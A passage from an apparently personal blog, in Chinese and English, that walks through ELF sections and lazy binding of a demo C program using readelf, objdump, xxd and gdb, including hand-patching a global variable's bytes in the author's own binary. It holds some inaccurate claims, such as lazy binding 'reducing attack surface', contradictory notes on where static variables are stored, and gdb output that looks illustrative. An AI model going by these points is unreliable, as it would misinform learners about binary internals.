external function calls (e.g., printf). .got 0x3fb0 Stores resolved addresses of external symbols. .rela.plt 0x678 Relocations for PLT entries (e.g., printf). .dynsym 0x3d8 Dynamic symbol table (includes unresolved symbols like printf). 2. Lazy Binding Workflow Lazy binding defers symbol resolution until the first call. Here’s how printf is resolved:\nStep 1: Initial Call to printf When print_message() calls printf, it jumps to the PLT entry for printf: print_message() { printf(\"%s\\n\", message); // Jumps to PLT entry for printf } Step 2: PLT Entry for printf The .plt section contains a stub for printf.\n0x1020: jmp *0x2f90(%rip) # Jump to GOT entry for printf 0x1026: pushq $0x0 # Argument for resolver 0x102b: jmp 0x1000 # Jump to dynamic linker resolver The GOT entry (0x3fb0 + offset) initially points to the resolver code in .plt.\nStep 3: Dynamic Linker Resolves printf The resolver (in .plt) calls the dynamic linker (ld-linux-x86-64.so.2) to: Look up printf in the symbol table (.symtab, .dynsym). Find the address of printf in libc.so.6. Update the GOT entry to point directly to libc’s printf. Step 4: Subsequent Calls to printf After resolution, the GOT entry points directly to libc’s printf, bypassing the resolver: 0x1020: jmp *0x2f90(%rip) # Now jumps directly to libc's printf 3. Observing Lazy Binding in Your Code Step 1: Find the PLT/GOT Entry for printf From readelf -s demo:\nSymbol table '.symtab' contains 46 entries: ... 30: 0000000000000000 0 FUNC GLOBAL DEFAULT UND printf@GLIBC_2.2.5 printf is an undefined symbol (UND), meaning it will be resolved dynamically. From readelf -r demo (relocations):\nRelocation section '.rela.plt' at offset 0x678 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 0x3fb8 0x0000000000020007 R_X86_64_JUMP_SLOT 0 printf + 0 The GOT entry at 0x3fb8 will hold the resolved address of printf. Step 2: Use gdb to Trace Lazy Binding Run the program in GDB: gdb ./demo Set a breakpoint at the PLT entry for printf: (gdb) break *0x1020 # First PLT entry (for printf) (gdb) run First call to printf: The program stops at 0x1020 (PLT stub). Step into the resolver: (gdb) stepi =\u003e 0x1026: pushq $0x0 # Push relocation index (gdb) stepi =\u003e 0x102b: jmp 0x1000 # Jump to resolver (dynamic linker) After resolution: The GOT entry at 0x3fb8 is updated to libc’s printf address: (gdb) x/gx 0x3fb8 0x3fb8: 0x7ffff7e12345 # Address of printf in libc Step 3: Verify with objdump Disassemble the .plt section:\nobjdump -d demo | grep -A 10 '\u003cprintf@plt\u003e' Output:\n0000000000001020 \u003cprintf@plt\u003e: 1020: ff 25 90 2f 00 00 jmpq *0x2f90(%rip) # 0x3fb8 \u003cprintf@got\u003e 1026: 68 00 00 00 00 pushq $0x0 102b: e9 d0 ff ff ff jmpq 1000 \u003c.plt\u003e The first jmpq jumps to the GOT entry at 0x3fb8. The second instruction pushes the relocation index for printf. 4. Summary of Lazy Binding Steps Initial Call:\nprintf → .plt stub → .got entry (points to resolver). Resolver Invoked:\nResolver calls dynamic linker to resolve printf in libc. GOT Updated:\nDynamic linker writes libc’s printf address to .got. Subsequent Calls:\n.plt → .got → libc’s printf directly. 5. Why Lazy Binding Matters Performance: Avoids resolving all symbols upfront. Memory Efficiency: Only resolves symbols that are actually used. Security: Reduces attack surface by deferring resolution. ","shstrtab-section-分析#\u003ccode\u003e.shstrtab section\u003c/code\u003e 分析":"","strtab-section-分析#\u003ccode\u003e.strtab section\u003c/code\u003e 分析":"","symbol-table-符号表分析#symbol table 符号表分析":""},"title":"Master Elf Sections Dynamic Link"},"/blog/master-elf-sections/":{"data":{"":"","bss-section-分析#\u003ccode\u003e.bss\u003c/code\u003e section 分析":"","data-section-分析#\u003ccode\u003e.data\u003c/code\u003e section 分析":"","databssrodatatext#data、bss、rodata、text":" data、rodata、text 在 demo 中位置关系","elf-linking-view-分析#ELF (linking view) 分析":"","readelf--s-section-headers#readelf -S (section headers)":"","readelf--t-display-the-section-details#readelf -t (Display the section details)":"","rodata-section-分析#\u003ccode\u003e.rodata\u003c/code\u003e section 分析":" 分析环境 mint21\nELF (linking view) 分析 一个 ELF 文件有多种 view。 从 linking 视角来理解 sections 到底是如何工作的。 源代码的各个不同的部分编译后都被放到了哪个 section。 本文主要分析 rodata text data bss 这 4 个 section。 示例代码 gcc -g -o demo demo.c\n编译后的各个文件\ndemo.c#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e // Global variable (initialized) → .data int global_data = 42; // Global variable (uninitialized) → .bss int global_bss; // Constant string → .rodata const char *message = \"Hello from .rodata!\"; // Static local variable → gcc stored in .bss (not .bss, = 0 it's uninitialized) void counter() { static int count = 0; count++; printf(\"Counter: %d\\n\", count); } // Destructor function → .fini_array __attribute__((destructor)) void finalize() { printf(\"Finalizing...\\n\"); } // Constructor function → .init_array __attribute__((constructor)) void initialize() { printf(\"Initializing...\\n\"); } // Function in .text void print_message() { printf(\"%s\\n\", message); // Uses PLT/GOT for printf } int main() { // Local static variable → stored in .data (initialized) static int local_static = 100; printf(\"Global Data: %d\\n\", global_data); printf(\"Global BSS: %d\\n\", global_bss); printf(\"Local Static: %d\\n\", local_static); print_message(); for (int i = 0; i \u003c 3; i++) { counter(); // Modifies static variable in .data } return 0; } readelf -h 查看基本信息 ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Position-Independent Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x1080 Start of program headers: 64 (bytes into file) Start of section headers: 15656 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 13 Size of section headers: 64 (bytes) Number of section headers: 37 Section header string table index: 36 header 信息 注意 Data: 2’s complement, little endian 注意: 使用的是小端。数据高位在高地址 Number of section headers: 37 一共 37 个 section readelf -t (Display the section details) There are 37 section headers, starting at offset 0x3d28: Section Headers: [Nr] Name Type Address Offset Link Size EntSize Info Align Flags [ 0] NULL 0000000000000000 0000000000000000 0 0000000000000000 0000000000000000 0 0 [0000000000000000]: [ 1] .interp PROGBITS 0000000000000318 0000000000000318 0 000000000000001c 0000000000000000 0 1 [0000000000000002]: ALLOC [ 2] .note.gnu.property NOTE 0000000000000338 0000000000000338 0 0000000000000030 0000000000000000 0 8 [0000000000000002]: ALLOC [ 3] .note.gnu.build-id NOTE 0000000000000368 0000000000000368 0 0000000000000024 0000000000000000 0 4 [0000000000000002]: ALLOC [ 4] .note.ABI-tag NOTE 000000000000038c 000000000000038c 0 0000000000000020 0000000000000000 0 4 [0000000000000002]: ALLOC [ 5] .gnu.hash GNU_HASH 00000000000003b0 00000000000003b0 6 0000000000000024 0000000000000000 0 8 [0000000000000002]: ALLOC [ 6] .dynsym DYNSYM 00000000000003d8 00000000000003d8 7 00000000000000c0 0000000000000018 1 8 [0000000000000002]: ALLOC [ 7] .dynstr STRTAB 0000000000000498 0000000000000498 0 0000000000000094 0000000000000000 0 1 [0000000000000002]: ALLOC [ 8] .gnu.version VERSYM 000000000000052c 000000000000052c 6 0000000000000010 0000000000000002 0 2 [0000000000000002]: ALLOC [ 9] .gnu.version_r VERNEED 0000000000000540 0000000000000540 7 0000000000000030 0000000000000000 1 8 [0000000000000002]: ALLOC [10] .rela.dyn RELA 0000000000000570 0000000000000570 6 0000000000000108 0000000000000018 0 8 [0000000000000002]: ALLOC [11] .rela.plt RELA 0000000000000678 0000000000000678 6 0000000000000030 0000000000000018 24 8 [0000000000000042]: ALLOC, INFO LINK [12] .init PROGBITS 0000000000001000 0000000000001000 0 000000000000001b 0000000000000000 0 4 [0000000000000006]: ALLOC, EXEC [13] .plt PROGBITS 0000000000001020 0000000000001020 0 0000000000000030 0000000000000010 0 16 [0000000000000006]: ALLOC, EXEC [14] .plt.got PROGBITS 0000000000001050 0000000000001050 0 0000000000000010 0000000000000010 0 16 [0000000000000006]: ALLOC, EXEC [15] .plt.sec PROGBITS 0000000000001060 0000000000001060 0 0000000000000020 0000000000000010 0 16 [0000000000000006]: ALLOC, EXEC [16] .text PROGBITS 0000000000001080 0000000000001080 0 00000000000001fb 0000000000000000 0 16 [0000000000000006]: ALLOC, EXEC [17] .fini PROGBITS 000000000000127c 000000000000127c 0 000000000000000d 0000000000000000 0 4 [0000000000000006]: ALLOC, EXEC [18] .rodata PROGBITS 0000000000002000 0000000000002000 0 0000000000000076 0000000000000000 0 4 [0000000000000002]: ALLOC [19] .eh_frame_hdr PROGBITS 0000000000002078 0000000000002078 0 0000000000000054 0000000000000000 0 4 [0000000000000002]: ALLOC [20] .eh_frame PROGBITS 00000000000020d0 00000000000020d0 0 000000000000012c 0000000000000000 0 8 [0000000000000002]: ALLOC [21] .init_array INIT_ARRAY 0000000000003da0 0000000000002da0 0 0000000000000010 0000000000000008 0 8 [0000000000000003]: WRITE, ALLOC [22] .fini_array FINI_ARRAY 0000000000003db0 0000000000002db0 0 0000000000000010 0000000000000008 0 8 [0000000000000003]: WRITE, ALLOC [23] .dynamic DYNAMIC 0000000000003dc0 0000000000002dc0 7 00000000000001f0 0000000000000010 0 8 [0000000000000003]: WRITE, ALLOC [24] .got PROGBITS 0000000000003fb0 0000000000002fb0 0 0000000000000050 0000000000000008 0 8 [0000000000000003]: WRITE, ALLOC [25] .data PROGBITS 0000000000004000 0000000000003000 0 0000000000000020 0000000000000000 0 8 [0000000000000003]: WRITE, ALLOC [26] .bss NOBITS 0000000000004020 0000000000003020 0 0000000000000010 0000000000000000 0 4 [0000000000000003]: WRITE, ALLOC [27] .comment PROGBITS 0000000000000000 0000000000003020 0 000000000000002b 0000000000000001 0 1 [0000000000000030]: MERGE, STRINGS [28] .debug_aranges PROGBITS 0000000000000000 000000000000304b 0 0000000000000030 0000000000000000 0 1 [0000000000000000]: [29] .debug_info PROGBITS 0000000000000000 000000000000307b 0 00000000000001ae 0000000000000000 0 1 [0000000000000000]: [30] .debug_abbrev PROGBITS 0000000000000000 0000000000003229 0 00000000000000e8 0000000000000000 0 1 [0000000000000000]: [31] .debug_line PROGBITS 0000000000000000 0000000000003311 0 00000000000000a2 0000000000000000 0 1 [0000000000000000]: [32] .debug_str PROGBITS 0000000000000000 00000000000033b3 0 000000000000013e 0000000000000001 0 1 [0000000000000030]: MERGE, STRINGS [33] .debug_line_str PROGBITS 0000000000000000 00000000000034f1 0 0000000000000030 0000000000000001 0 1 [0000000000000030]: MERGE, STRINGS [34] .symtab SYMTAB 0000000000000000 0000000000003528 35 0000000000000450 0000000000000018 20 8 [0000000000000000]: [35] .strtab STRTAB 0000000000000000 0000000000003978 0 0000000000000245 0000000000000000 0 1 [0000000000000000]: [36] .shstrtab STRTAB 0000000000000000 0000000000003bbd 0 000000000000016a 0000000000000000 0 1 [0000000000000000]: readelf -S (section headers) There are 37 section headers, starting at offset 0x3d28: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000000318 00000318 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.gnu.pr[...] NOTE 0000000000000338 00000338 0000000000000030 0000000000000000 A 0 0 8 [ 3] .note.gnu.bu[...] NOTE 0000000000000368 00000368 0000000000000024 0000000000000000 A 0 0 4 [ 4] .note.ABI-tag NOTE 000000000000038c 0000038c 0000000000000020 0000000000000000 A 0 0 4 [ 5] .gnu.hash GNU_HASH 00000000000003b0 000003b0 0000000000000024 0000000000000000 A 6 0 8 [ 6] .dynsym DYNSYM 00000000000003d8 000003d8 00000000000000c0 0000000000000018 A 7 1 8 [ 7] .dynstr STRTAB 0000000000000498 00000498 0000000000000094 0000000000000000 A 0 0 1 [ 8] .gnu.version VERSYM 000000000000052c 0000052c 0000000000000010 0000000000000002 A 6 0 2 [ 9] .gnu.version_r VERNEED 0000000000000540 00000540 0000000000000030 0000000000000000 A 7 1 8 [10] .rela.dyn RELA 0000000000000570 00000570 0000000000000108 0000000000000018 A 6 0 8 [11] .rela.plt RELA 0000000000000678 00000678 0000000000000030 0000000000000018 AI 6 24 8 [12] .init PROGBITS 0000000000001000 00001000 000000000000001b 0000000000000000 AX 0 0 4 [13] .plt PROGBITS 0000000000001020 00001020 0000000000000030 0000000000000010 AX 0 0 16 [14] .plt.got PROGBITS 0000000000001050 00001050 0000000000000010 0000000000000010 AX 0 0 16 [15] .plt.sec PROGBITS 0000000000001060 00001060 0000000000000020 0000000000000010 AX 0 0 16 [16] .text PROGBITS 0000000000001080 00001080 00000000000001fb 0000000000000000 AX 0 0 16 [17] .fini PROGBITS 000000000000127c 0000127c 000000000000000d 0000000000000000 AX 0 0 4 [18] .rodata PROGBITS 0000000000002000 00002000 0000000000000076 0000000000000000 A 0 0 4 [19] .eh_frame_hdr PROGBITS 0000000000002078 00002078 0000000000000054 0000000000000000 A 0 0 4 [20] .eh_frame PROGBITS 00000000000020d0 000020d0 000000000000012c 0000000000000000 A 0 0 8 [21] .init_array INIT_ARRAY 0000000000003da0 00002da0 0000000000000010 0000000000000008 WA 0 0 8 [22] .fini_array FINI_ARRAY 0000000000003db0 00002db0 0000000000000010 0000000000000008 WA 0 0 8 [23] .dynamic DYNAMIC 0000000000003dc0 00002dc0 00000000000001f0 0000000000000010 WA 7 0 8 [24] .got PROGBITS 0000000000003fb0 00002fb0 0000000000000050 0000000000000008 WA 0 0 8 [25] .data PROGBITS 0000000000004000 00003000 0000000000000020 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000004020 00003020 0000000000000010 0000000000000000 WA 0 0 4 [27] .comment PROGBITS 0000000000000000 00003020 000000000000002b 0000000000000001 MS 0 0 1 [28] .debug_aranges PROGBITS 0000000000000000 0000304b 0000000000000030 0000000000000000 0 0 1 [29] .debug_info PROGBITS 0000000000000000 0000307b 00000000000001ae 0000000000000000 0 0 1 [30] .debug_abbrev PROGBITS 0000000000000000 00003229 00000000000000e8 0000000000000000 0 0 1 [31] .debug_line PROGBITS 0000000000000000 00003311 00000000000000a2 0000000000000000 0 0 1 [32] .debug_str PROGBITS 0000000000000000 000033b3 000000000000013e 0000000000000001 MS 0 0 1 [33] .debug_line_str PROGBITS 0000000000000000 000034f1 0000000000000030 0000000000000001 MS 0 0 1 [34] .symtab SYMTAB 0000000000000000 00003528 0000000000000450 0000000000000018 35 20 8 [35] .strtab STRTAB 0000000000000000 00003978 0000000000000245 0000000000000000 0 0 1 [36] .shstrtab STRTAB 0000000000000000 00003bbd 000000000000016a 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) .data section 分析 [25] .data PROGBITS 0000000000004000 00003000 0000000000000020 0000000000000000 WA 0 0 8 .data section 字段解释 Field Value Meaning [25] Section Index The 25th section in the ELF file. Used internally by tools like readelf. .data Section Name Holds initialized global/static variables (e.g., global_data, local_static, message). PROGBITS Section Type Contains raw data (code, initialized data) stored in the file. Not dynamically generated at runtime. 0000000000004000 Virtual Address (VA) At runtime, this section will be mapped to virtual address 0x4000 in memory. 00003000 File Offset In the file (demo), this section starts at byte offset 0x3000 (12288 in decimal). 0000000000000020 Size Size of the section in bytes: 0x20 (32 bytes). Spans from 0x3000 to 0x3020 in the file. 0000000000000000 Entry Size (EntSize) If the section contains fixed-size entries (e.g., symbol tables), this specifies their size. Here it’s 0 → no fixed-size entries. WA Flags Section attributes: W = Writable (memory can be modified at runtime).\nA = Allocated (loaded into memory during execution). No X → this section is not executable. 0 Link Relates to other sections; used for symbol tables or relocation (value 0 here = unused). 0 Info Extra information (e.g., section index of related section); unused here. 8 Alignment Memory alignment requirement: must start at an address divisible by 8. Key Takeaways Virtual Address (VA): 0x4000\nAt runtime, the .data section is mapped to virtual address 0x4000. This is a runtime memory address, not a file offset. Example: Your message variable is located at 0x4000 + 0x18 = 0x4018. File Offset: 0x3000\nIn the file (demo), the .data section starts at byte 12288 (hex 0x3000). Since the file size is 16320 bytes (~0x4000), this offset is valid. Size: 0x20 (32 bytes)\nThe section spans 32 bytes on disk (0x3000 to 0x3020) and in memory (0x4000 to 0x4020). Flags: WA (Writable + Allocated)\nThe OS loads this section into memory with write permissions. You can modify variables like global_data at runtime. Alignment: 8\nEnsures efficient memory access by aligning the section to 8-byte boundaries. 查看 demo 中 0x3000(.data) 后 0x20(32) 字节的内容 xxd -l 32 -s 0x3000 demo 00003000: 0000 0000 0000 0000 0840 0000 0000 0000 .........@...... 00003010: 2a00 0000 6400 0000 0420 0000 0000 0000 *...d.... ...... global variable 之 message 分析 const char *message = \"Hello from .rodata!\"; message 符号信息 nm demo | grep message 0000000000004018 D message 00000000000011d3 T print_message message is a pointer variable stored in .data. message virtual address = 0x4018 data section 中的 virtual address, message offset = VA(message) - VA(start of .data) = 0x4018 - 0x4000 = 0x18 message 这个 global variable 的指针在 demo 的 offset 是 0x000003000 + 0x18 = 0x3018 可知 0x3018 处 8 字节的内容为 0420 0000 0000 0000 ELF 小端存储, 所以值为 0x2004, 这就是 message 变量的值 查找 message 字符串内容 xxd demo | grep -A 1 \"Hello from\" 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ....Hello from . 00002010: 726f 6461 7461 2100 436f 756e 7465 723a rodata!.Counter: 可知 Hello from .rodata! 这一串字符所在文件 offset = 0x00002004 这就是 data section 中 global variable message 所指向的字符串 查找 message 字符串内容在何处? 在 .rodata 只读数据 section 中\n[18] .rodata PROGBITS 0000000000002000 00002000 0000000000000076 0000000000000000 A 0 0 4 initialized global variable 之 global_data global_data 符号信息 nm demo | grep global_data 0000000000004010 D global_data 00003000: 0000 0000 0000 0000 0840 0000 0000 0000 .........@...... 00003010: 2a00 0000 6400 0000 0420 0000 0000 0000 *...d.... ...... global_data offset = VA(message) - VA(start of .data) = 0x4010 - 0x4000 = 0x10 global_data 这个 global variable 的指针在 demo 的 offset 是 0x000003000 + 0x10 = 0x3010 int global_data 为 4bytes。2a00 0000 转为小端 0x0000002a, 就是 42 替换 global_data 的值 使用脚本update.sh\n操纵 demo 文件中 offset = 0x3010 这 1 个 byte。🤣 global_data 重新设置为 0xff\n./demo Initializing... Global Data: 42 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 Finalizing... ./update.sh demo 0x3010 0xff Updated byte at offset 12304 (0x3010) to 0xff ./demo Initializing... Global Data: 255 #🤣🤣🤣，这就是逆向。 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 Finalizing... 操纵 demo 文件中 offset = (0x3010,0x3013) 这 4 个 byte。🤣 global_data 重新设置为 0x12345678, 注意是小端。高位高地址\n./update.sh demo 0x3010 0x78 Updated byte at offset 12304 (0x3010) to 0x78 ./update.sh demo 0x3011 0x56 Updated byte at offset 12305 (0x3011) to 0x56 ./update.sh demo 0x3012 0x34 Updated byte at offset 12306 (0x3012) to 0x34 ./update.sh demo 0x3013 0x12 Updated byte at offset 12307 (0x3013) to 0x12 ./demo Initializing... Global Data: 305419896 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 Finalizing... .data section 总结 Section File Offset Size (Bytes) Virtual Address Runtime Permissions .data 0x3000 0x20 (32) 0x4000 Writable + Allocated (WA) .bss section 分析 [26] .bss NOBITS 0000000000004020 00003020 0000000000000010 0000000000000000 WA 0 0 4 .bss section 字段解释 Field Value Meaning [26] Section Index The 26th section in the ELF file. Tools use this internally. .bss Section Name Stands for Block Started by Symbol. Holds uninitialized global/static variables (e.g., global_bss, count.1 in your code). NOBITS Section Type Indicates this section does not occupy space in the file (NOBITS = no bytes on disk). Memory is allocated at runtime and initialized to zero. 0000000000004020 Virtual Address (VA) At runtime, this section will be mapped to virtual address 0x4020. 00003020 File Offset In the file (demo), this section starts at byte 0x3020. Since it’s NOBITS, this value is unused (placeholder for alignment/padding). 0000000000000010 Size Size of the section in memory: 0x10 (16 bytes). The OS allocates this much zeroed memory at runtime. 0000000000000000 Entry Size (EntSize) Not applicable here; set to 0 because .bss contains no fixed-size entries. WA Flags Section attributes: W = Writable (variables can be modified at runtime). A = Allocated (memory is reserved at runtime). No X → not executable. 0 Link Relates to other sections; unused here. 0 Info Extra metadata; unused here. 4 Alignment Must start at an address divisible by 4 in memory. Key Takeaways Purpose of .bss\nStores uninitialized global/static variables, such as:\nint global_bss; // Uninitialized global variable static int count.1; // Static local variable in `counter()` These are zeroed out at runtime.\nNo Space in File (NOBITS)\nUnlike .data, .bss does not store values in the file. 🤔 不占用存储空间 The OS allocates and initializes this section to zero during program startup. Saves disk space: zero-filled regions don’t need explicit storage. Runtime Allocation\nVirtual Address: 0x4020 (where .bss lives in memory). Size: 0x10 (16 bytes) → covers all uninitialized variables. Example: global_bss is 4 bytes and count.1 is 4 bytes Flags: WA (Writable + Allocated)\nWritable: Variables like global_bss can be modified at runtime. Allocated: Reserved in memory, but not stored in the file. File Offset: 0x3020\nExists only for padding/alignment in the file. Ignored by the OS because .bss is NOBITS. Alignment: 4\nEnsures efficient memory access by aligning the section to 4-byte boundaries. Why .bss Is Efficient Disk Space: Does not duplicate zeros in the file (saves space). Memory: Zeroed at runtime by the OS using calloc-like behavior. Security: Prevents leaking old memory contents (ensures clean state). uninitialized global variable 之 global_bss global_bss 符号信息 nm demo | grep global_bss 0000000000004024 B global_bss uninitialized static local variable 之 count count 符号信息 nm demo | grep count.1 0000000000004028 b count.1 不占用存储空间的 bss [25] .data PROGBITS 0000000000004000 00003000 0000000000000020 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000004020 00003020 0000000000000010 0000000000000000 WA 0 0 4 [27] .comment PROGBITS 0000000000000000 00003020 000000000000002b 0000000000000001 MS 0 0 1 demo 中 25、26、27 三个 section 布局 +---------------------+ 0x3000 (start of .data) | 0x20(32 bytes) +---------------------+ 0x3020 (end of .bss, start of .bss, end of .bss, start of .comment) | 0x2b(42 bytes) +---------------------+ 0x304b (end of .comment) .bss section 在 demo 中不占实际的存储空间\n.bss section 总结 Section File Offset Size (Bytes) Virtual Address Runtime Permissions Content Type .bss 0x3020 0x0 (no bits stored) 0x4020 Writable + Allocated (WA) Uninitialized variables (zeroed at runtime) .text section 分析 .text 字段解释 Field Value Meaning [16] Section index .text is the 16th section in the ELF file. .text Section name Contains machine code (compiled functions). PROGBITS Section type Data is stored in the file (not NOBITS). 0000000000001080 Virtual Address (VA) This section is mapped to virtual address 0x1080 (relative to the randomized PIE base address). 00001080 File Offset Start of the .text section in the file: byte 0x1080 (4224 in decimal). 00000000000001fb Size Size of the .text section: 0x1fb bytes (507 bytes). 0000000000000000 Entry Size (EntSize) Not used for .text (applies to sections with fixed-size entries, like .symtab). AX Flags Section attributes: A = Allocated (loaded into memory). X = Executable (code can run as machine instructions). 0 Link Unused for .text (used for symbol tables). 0 Info Unused for .text (used for .text with extra metadata). 16 Alignment Must be aligned to a 16-byte boundary in memory. Virtual Address = 0000000000001080 和 readelf -h 查看的 entry point address 一致\nKey Takeaways Purpose of .text:\nContains compiled machine code (e.g., main(), counter(), print_message()). Stored in the file and loaded into memory as executable code. Virtual Address (VA):\nAt runtime, the .text section starts at virtual address 0x1080 (relative to the base address chosen by ASLR). Example: If the base address is 0x555555554000, .text starts at 0x555555555080. File Offset:\nIn the file (demo), .text starts at byte 0x1080 (4224 in decimal). This is where the compiler stores the raw machine code for your functions. Size: 0x1fb (507 bytes):\nTotal size of the .text section in both the file and memory. Spans from 0x1080 to 0x1080 + 0x1fb = 0x127b. Flags: AX (Allocated + eXecutable):\nMemory is marked executable (X), allowing CPU to run the code. Memory is allocated (A), but not writable (W). Alignment: 16:\nEnsures the .text section starts at a 16-byte aligned address in memory. Optimizes instruction cache and CPU performance. .text section 之 counter function 分析 void counter() { static int count = 0; count++; printf(\"Counter: %d\\n\", count); } counter 符号信息 nm demo | grep counter 0000000000001169 T counter objdump 查看 counter objdump demo --disassemble=counter demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 0000000000001169 \u003ccounter\u003e: 1169: f3 0f 1e fa endbr64 116d: 55 push %rbp 116e: 48 89 e5 mov %rsp,%rbp 1171: 8b 05 b1 2e 00 00 mov 0x2eb1(%rip),%eax # 4028 \u003ccount.1\u003e 1177: 83 c0 01 add $0x1,%eax 117a: 89 05 a8 2e 00 00 mov %eax,0x2ea8(%rip) # 4028 \u003ccount.1\u003e 1180: 8b 05 a2 2e 00 00 mov 0x2ea2(%rip),%eax # 4028 \u003ccount.1\u003e 1186: 89 c6 mov %eax,%esi 1188: 48 8d 05 89 0e 00 00 lea 0xe89(%rip),%rax # 2018 \u003c_IO_stdin_used+0x18\u003e 118f: 48 89 c7 mov %rax,%rdi 1192: b8 00 00 00 00 mov $0x0,%eax 1197: e8 d4 fe ff ff call 1070 \u003cprintf@plt\u003e 119c: 90 nop 119d: 5d pop %rbp 119e: c3 ret Disassembly of section .fini: .text section 之 print_message function 分析 void print_message() { printf(\"%s\\n\", message); } print_message 符号信息 nm demo | grep print_message 00000000000011d3 T print_message objdump 查看 print_message objdump demo --disassemble=print_message demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000011d3 \u003cprint_message\u003e: 11d3: f3 0f 1e fa endbr64 11d7: 55 push %rbp 11d8: 48 89 e5 mov %rsp,%rbp 11db: 48 8b 05 36 2e 00 00 mov 0x2e36(%rip),%rax # 4018 \u003cmessage\u003e 11e2: 48 89 c7 mov %rax,%rdi 11e5: e8 76 fe ff ff call 1060 \u003cputs@plt\u003e 11ea: 90 nop 11eb: 5d pop %rbp 11ec: c3 ret Disassembly of section .fini: .text section 之 main function 分析 main 符号信息 nm demo | grep main U __libc_start_main@GLIBC_2.34 00000000000011ed T main objdump 查看 main objdump demo --disassemble=main demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000011ed \u003cmain\u003e: 11ed: f3 0f 1e fa endbr64 11f1: 55 push %rbp 11f2: 48 89 e5 mov %rsp,%rbp 11f5: 48 83 ec 10 sub $0x10,%rsp 11f9: 8b 05 11 2e 00 00 mov 0x2e11(%rip),%eax # 4010 \u003cglobal_data\u003e 11ff: 89 c6 mov %eax,%esi 1201: 48 8d 05 3b 0e 00 00 lea 0xe3b(%rip),%rax # 2043 \u003c_IO_stdin_used+0x43\u003e 1208: 48 89 c7 mov %rax,%rdi 120b: b8 00 00 00 00 mov $0x0,%eax 1210: e8 5b fe ff ff call 1070 \u003cprintf@plt\u003e 1215: 8b 05 09 2e 00 00 mov 0x2e09(%rip),%eax # 4024 \u003cglobal_bss\u003e 121b: 89 c6 mov %eax,%esi 121d: 48 8d 05 30 0e 00 00 lea 0xe30(%rip),%rax # 2054 \u003c_IO_stdin_used+0x54\u003e 1224: 48 89 c7 mov %rax,%rdi 1227: b8 00 00 00 00 mov $0x0,%eax 122c: e8 3f fe ff ff call 1070 \u003cprintf@plt\u003e 1231: 8b 05 dd 2d 00 00 mov 0x2ddd(%rip),%eax # 4014 \u003clocal_static.0\u003e 1237: 89 c6 mov %eax,%esi 1239: 48 8d 05 24 0e 00 00 lea 0xe24(%rip),%rax # 2064 \u003c_IO_stdin_used+0x64\u003e 1240: 48 89 c7 mov %rax,%rdi 1243: b8 00 00 00 00 mov $0x0,%eax 1248: e8 23 fe ff ff call 1070 \u003cprintf@plt\u003e 124d: b8 00 00 00 00 mov $0x0,%eax 1252: e8 7c ff ff ff call 11d3 \u003cprint_message\u003e 1257: c7 45 fc 00 00 00 00 movl $0x0,-0x4(%rbp) 125e: eb 0e jmp 126e \u003cmain+0x81\u003e 1260: b8 00 00 00 00 mov $0x0,%eax 1265: e8 ff fe ff ff call 1169 \u003ccounter\u003e 126a: 83 45 fc 01 addl $0x1,-0x4(%rbp) 126e: 83 7d fc 02 cmpl $0x2,-0x4(%rbp) 1272: 7e ec jle 1260 \u003cmain+0x73\u003e 1274: b8 00 00 00 00 mov $0x0,%eax 1279: c9 leave 127a: c3 ret Disassembly of section .fini: .text section 之 initialize function 分析 objdump 查看 initialize objdump demo --disassemble=initialize demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000011b9 \u003cinitialize\u003e: 11b9: f3 0f 1e fa endbr64 11bd: 55 push %rbp 11be: 48 89 e5 mov %rsp,%rbp 11c1: 48 8d 05 6b 0e 00 00 lea 0xe6b(%rip),%rax # 2033 \u003c_IO_stdin_used+0x33\u003e 11c8: 48 89 c7 mov %rax,%rdi 11cb: e8 90 fe ff ff call 1060 \u003cputs@plt\u003e 11d0: 90 nop 11d1: 5d pop %rbp 11d2: c3 ret Disassembly of section .fini: .text section 之 finalize function 分析 objdump 查看 finalize objdump demo --disassemble=finalize demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 000000000000119f \u003cfinalize\u003e: 119f: f3 0f 1e fa endbr64 11a3: 55 push %rbp 11a4: 48 89 e5 mov %rsp,%rbp 11a7: 48 8d 05 77 0e 00 00 lea 0xe77(%rip),%rax # 2025 \u003c_IO_stdin_used+0x25\u003e 11ae: 48 89 c7 mov %rax,%rdi 11b1: e8 aa fe ff ff call 1060 \u003cputs@plt\u003e 11b6: 90 nop 11b7: 5d pop %rbp 11b8: c3 ret Disassembly of section .fini: Security Implications NX Bit (No-eXecute):\nThe .text section is executable (X), but not writable (W), preventing code injection. ASLR (Address Space Layout Randomization):\nVirtual addresses like 0x1080 are offsets from a randomized 